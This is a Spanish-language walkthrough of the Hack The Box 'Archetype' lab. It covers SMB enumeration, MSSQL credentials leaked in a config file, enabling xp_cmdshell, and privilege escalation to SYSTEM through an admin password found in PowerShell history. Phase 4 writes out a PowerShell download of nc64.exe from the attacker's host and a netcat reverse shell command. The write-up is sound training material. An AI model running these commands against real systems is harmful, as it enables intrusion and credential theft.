# Laboratorio 'Archetype' de Hack The Box: Write-up Detallado

Este documento es un resumen técnico y una guía de la resolución del laboratorio **Archetype** de Hack The Box. El objetivo es documentar el proceso completo, desde el reconocimiento inicial hasta la escalada de privilegios final, sirviendo como material de consulta para consolidar los conceptos aplicados.
---

## Índice
* Introducción y Objetivo
* Fase 1: Reconocimiento y Enumeración
* Fase 2: Acceso Inicial y Explotación de Malas Configuraciones
* Fase 3: Pivote y Ejecución de Comandos vía MSSQL
* Fase 4: Estableciendo una Shell Reversa (Análisis Profundo)
* Fase 5: Escalada de Privilegios
* Fase 6: Acceso Total y Conclusiones

---

## Introducción y Objetivo
**Archetype** es una máquina Windows de dificultad media cuyo objetivo es obtener acceso total al sistema (**`nt authority\system`**). El laboratorio está diseñado para simular un escenario realista donde un atacante explota una serie de vulnerabilidades en cadena: una mala configuración en un recurso compartido, credenciales expuestas, privilegios excesivos en una base de datos y una pobre higiene operativa (OpSec) por parte de un administrador.

---

## Fase 1: Reconocimiento y Enumeración
El primer paso en cualquier pentest es entender la superficie de ataque.

**Acciones Realizadas:**

* *Escaneo de Puertos con Nmap:* Se identificaron los servicios expuestos en la máquina objetivo.
    ```bash
    nmap -sC -sV <TARGET_IP>
    ```

**Resultados Clave:**
* `139/tcp`, `445/tcp`: **SMB** (Server Message Block), indicando recursos compartidos de Windows.
* `1433/tcp`: **Microsoft SQL Server**, un potente motor de base de datos.

* *Enumeración de SMB:* Se utilizó `smbclient` para listar los recursos compartidos accesibles de forma anónima.
    ```bash
    smbclient -N -L \\\\<TARGET_IP>\\
    ```
* **Descubrimiento:** Se encontró un recurso compartido de interés llamado `backups`, accesible sin autenticación.

---

## Fase 2: Acceso Inicial y Explotación de Malas Configuraciones
El recurso `backups` se convirtió en el punto de entrada inicial.

**Acciones Realizadas:**

* *Acceso al Recurso:* Se conectó al recurso `backups` y se listó su contenido.
    ```bash
    smbclient -N \\\\<TARGET_IP>\\backups
    smb: \> dir
    ```
* **Hallazgo Crítico:** Se encontró un archivo `prod.dtsConfig`. Los archivos de configuración son siempre un objetivo de alta prioridad.
* **Recolección de Credenciales:** Al descargar (`get prod.dtsConfig`) e inspeccionar el archivo, se encontraron credenciales de la base de datos MSSQL en texto plano.
    ```xml
    <ConfiguredValue>
        Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...
    </ConfiguredValue>
    ```
* **Usuario:** `ARCHETYPE\sql_svc`
* **Contraseña:** `M3g4c0rp123`

---

## Fase 3: Pivote y Ejecución de Comandos vía MSSQL
Con las credenciales, el siguiente paso fue pivotar desde el acceso a la base de datos hacia la ejecución de comandos en el sistema operativo.

**Acciones Realizadas:**

* *Autenticación en MSSQL:* Se usó el script `mssqlclient.py` de la suite Impacket para autenticarse en el servidor.
    ```bash
    python3 mssqlclient.py ARCHETYPE/sql_svc@<TARGET_IP> -windows-auth
    ```
* *Verificación de Privilegios:* Se comprobó si el usuario tenía privilegios de administrador en la base de datos.
    ```sql
    SQL> SELECT is_srvrolemember('sysadmin');
    ```
    El resultado (`1`) confirmó que `sql_svc` era **`sysadmin`**, un fallo de seguridad crítico que viola el principio de mínimo privilegio.

* *Habilitación de `xp_cmdshell`:* Esta potente stored procedure, que permite ejecutar comandos del sistema operativo, estaba deshabilitada por defecto. Se habilitó con los siguientes comandos:
    ```sql
    SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    ```
* *Confirmación de Ejecución de Comandos:*
    ```sql
    SQL> xp_cmdshell "whoami"
    ```
    La salida `archetype\sql_svc` confirmó el éxito.

---

## Fase 4: Estableciendo una Shell Reversa (Análisis Profundo)
La ejecución de comandos a través de `xp_cmdshell` es limitada. Para un control interactivo y estable, es esencial establecer una shell reversa.

### ¿Qué es y por qué usar una Shell Reversa?
Una **shell reversa** es una sesión de línea de comandos donde la máquina víctima inicia la conexión hacia el atacante. Esto es fundamental en pentesting porque las reglas de firewall de las redes corporativas suelen ser restrictivas para las conexiones entrantes (desde internet hacia el servidor), pero muy permisivas para las conexiones salientes (desde el servidor hacia internet). Al hacer que la víctima se conecte "hacia afuera", evadimos eficazmente estas protecciones perimetrales.

### El Papel de Netcat y cmd.exe
En esta fase, se combinan dos herramientas para lograr la shell:

* **Netcat (`nc`):** Es la navaja suiza de las redes. En la máquina del atacante, actúa como un *listener* (`-l`), esperando una conexión entrante en un puerto específico.
* **`cmd.exe`:** Es el intérprete de comandos de Windows. Este es el programa que realmente ejecutará los comandos en la máquina víctima. Netcat solo sirve como el "canal" o "tubería" para conectar nuestro terminal remoto a este intérprete.

**Acciones Realizadas:**

1.  **Preparación del Atacante:**
    * *Servidor HTTP:* Se levanta un servidor web simple con Python para alojar el payload (`nc64.exe`).
        ```bash
        # En una terminal del atacante
        sudo python3 -m http.server 80
        ```
    * *Listener con Netcat:* Se pone a Netcat a escuchar en un puerto (ej. 443) para recibir la conexión de la víctima.
        ```bash
        # En otra terminal del atacante
        sudo nc -lvnp 443
        ```

2.  **Transferencia del Payload a la Víctima:**
    * Usando `xp_cmdshell`, se ejecuta un comando de PowerShell en la víctima para descargar `nc64.exe` desde el servidor del atacante a un directorio con permisos de escritura.
        ```sql
        SQL> xp_cmdshell "powershell -c "cd C:\Users\sql_svc\Downloads; wget http://<IP_ATACANTE>/nc64.exe -outfile nc64.exe""
        ```

3.  **Ejecución de la Shell Reversa:**
    * Se ejecuta el comando final para iniciar `nc64.exe` en la víctima. Este comando le dice a Netcat que se conecte a la IP y puerto del atacante y, una vez conectado, ejecute (`-e`) el programa `cmd.exe`, vinculando la sesión de red a la entrada/salida del intérprete de comandos.
        ```sql
        SQL> xp_cmdshell "powershell -c "C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe <IP_ATACANTE> 443""
        ```
Al ejecutar este último paso, el listener de Netcat en la máquina del atacante recibe la conexión y presenta un prompt interactivo de Windows (`C:\Users\sql_svc\Downloads>`), confirmando un punto de apoyo (*foothold*) exitoso en el sistema.

---

## Fase 5: Escalada de Privilegios
Con una shell como usuario estándar, el objetivo es convertirse en administrador.

**Acciones Realizadas:**

* *Enumeración Local con winPEAS:* Se transfirió y ejecutó la herramienta `winPEASx64.exe` en la víctima. winPEAS automatiza la búsqueda de vectores de escalada de privilegios.
* **Descubrimiento Clave:** winPEAS encontró un archivo de historial de PowerShell: `ConsoleHost_history.txt`.
* **Credenciales de Administrador en Texto Plano:** Al leer el archivo, se encontró un comando ejecutado previamente que contenía la contraseña del administrador:
    ```powershell
    C:\> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

    net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
    ```
* **Contraseña del Administrador:** `MEGACORP_4dm1n!!`

---

## Fase 6: Acceso Total y Conclusiones
Con las credenciales de administrador, el compromiso total del sistema es el último paso.

**Acciones Realizadas:**

* *Obtención de Shell de SYSTEM:* Se utilizó `psexec.py` de Impacket, junto con la contraseña encontrada, para obtener una shell con los máximos privilegios.
    ```bash
    python3 psexec.py administrator@<TARGET_IP>
    ```
* *Confirmación de Acceso Total:*
    ```powershell
    C:\Windows\system32> whoami
    nt authority\system
    ```
Con privilegios de **`SYSTEM`**, se tiene control absoluto sobre la máquina y se puede acceder a todas las banderas (`user.txt` y `root.txt`).

### Conclusiones Clave del Laboratorio
* **La defensa en profundidad es crucial:** Un solo fallo (como el recurso SMB abierto) puede no ser suficiente, pero una cadena de fallos conduce a un compromiso total.
* **Principio de Mínimo Privilegio:** Los usuarios de servicio NUNCA deben tener privilegios de `sysadmin`. Este fue el error pivotal del laboratorio.
* **Higiene Operativa (OpSec):** Dejar credenciales en texto plano, ya sea en archivos de configuración o en historiales de comandos, es una invitación al desastre.
* **El Firewall no es suficiente:** Una shell reversa demuestra por qué las políticas de firewall deben controlar tanto el tráfico entrante como el saliente.